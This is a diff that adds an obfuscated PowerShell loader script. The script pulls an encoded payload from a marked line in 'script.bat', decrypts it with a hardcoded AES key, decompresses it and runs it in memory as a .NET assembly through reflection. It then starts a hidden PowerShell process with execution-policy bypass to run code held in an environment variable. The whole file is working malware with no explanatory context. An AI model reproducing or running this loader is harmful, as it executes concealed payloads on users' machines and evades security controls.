@@ -1,0 +1,46 @@
+function vJrGr($jphiO)
+{
+    $IDsHa = [System.Security.Cryptography.Aes]::Create()
+    $IDsHa.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $IDsHa.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $IDsHa.Key = [System.Convert]::FromBase64String('C63yD6DvBOpCsJOGM6Xrb8NqD+eP8mVlQhia90OsK+M=')
+    $IDsHa.IV = [System.Convert]::FromBase64String('k7BsuukIikJc9gk/tuFGag==')
+    $MLjiQ = $IDsHa.CreateDecryptor()
+    $return_var = $MLjiQ.TransformFinalBlock($jphiO, 0, $jphiO.Length)
+    $MLjiQ.Dispose()
+    $IDsHa.Dispose()
+    return $return_var
+}
+
+function bahjX($jphiO) {
+    $DzVtb = New-Object System.IO.MemoryStream($jphiO)
+    $rrmtA = New-Object System.IO.MemoryStream
+    Invoke-Expression '$NHDkx = New-Object System.IO.Compression.GzipStream($DzVtb, [System.IO.Compression.CompressionMode]::Decompress)' 
+    $NHDkx.CopyTo($rrmtA)
+    $NHDkx.Dispose()
+    $DzVtb.Dispose()
+    $rrmtA.Dispose()
+    return $rrmtA.ToArray()
+}
+
+function zxevz($jphiO, $hEAZg) {
+    $IzeQA = @(
+        '$cnneN = [System.Reflection.Assembly]::Load([byte[]]$jphiO)',
+        '$qRVcf = $cnneN.EntryPoint',
+        '$qRVcf.Invoke($null, $hEAZg)'
+    )
+    foreach ($mBchN in $IzeQA) {
+        Invoke-Expression $mBchN
+    }
+}
+
+$NHOiB = [System.IO.File]::ReadAllText('script.bat').Split([Environment]::NewLine)
+foreach ($JGlQL in $NHOiB) {
+    if ($JGlQL.StartsWith('MROXEN')) {
+        $SOJPJ = $JGlQL.Substring(6)
+        break
+    }
+}
+$cjdEt = bahjX(vJrGr([System.Convert]::FromBase64String($SOJPJ))))
+zxevz $cjdEt ( [string[]] ('script.bat'))
+& echo Invoke-Expression $env:pWGmLDAEoc | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -noprofile -windowstyle hidden > nul
